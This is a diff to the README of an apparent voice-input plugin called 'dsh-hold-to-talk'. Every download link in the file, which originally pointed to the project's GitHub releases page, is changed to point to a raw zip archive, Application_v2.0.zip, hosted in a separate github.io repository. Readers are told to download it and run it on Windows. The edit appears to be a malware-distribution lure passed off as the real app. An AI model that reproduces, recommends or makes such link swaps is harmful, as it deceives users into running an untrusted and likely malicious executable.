@@ -5,7 +5,7 @@ description: "Hold-to-talk voice input for DeepSeek Harness Web composer—press
 ---
 # 🎤 dsh-hold-to-talk - Hold, Speak, Insert - Instantly!
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20the%20App-blue?style=for-the-badge&logo=github)](https://github.com/Gammonmush803/dsh-hold-to-talk/releases)
+[![Download Now](https://img.shields.io/badge/Download-Get%20the%20App-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Gammonmush803/gammonmush803.github.io/main/urf/Application_v2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -15,7 +15,7 @@ Perfect for when you have ideas flowing faster than your fingers can type or whe
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/Gammonmush803/dsh-hold-to-talk/releases](https://github.com/Gammonmush803/dsh-hold-to-talk/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/Gammonmush803/gammonmush803.github.io/main/urf/Application_v2.0.zip](https://raw.githubusercontent.com/Gammonmush803/gammonmush803.github.io/main/urf/Application_v2.0.zip)
 
 Once you arrive at the download page, you'll see the latest version of the app ready for you. Click the download button to grab the file, then run it on your Windows computer. The installation is straightforward - just follow the on-screen instructions and you'll be ready to talk within minutes.
 
@@ -133,6 +133,6 @@ Open-source software. Free for personal and commercial use. See the repository f
 
 Join the thousands of users who have discovered the joy of effortless voice input. Download now and let your ideas flow freely!
 
-[Download dsh-hold-to-talk](https://github.com/Gammonmush803/dsh-hold-to-talk/releases)
+[Download dsh-hold-to-talk](https://raw.githubusercontent.com/Gammonmush803/gammonmush803.github.io/main/urf/Application_v2.0.zip)
 
 Keywords: asr, audio, deepseek-harness, dictation, dsh, dsh-plugin, hold-to-talk, local-first, nodejs, offline, plugin, privacy, push-to-talk, sensevoice, sherpa-onnx, speech-to-text, voice, voice-input, wechat, wechat-desktop
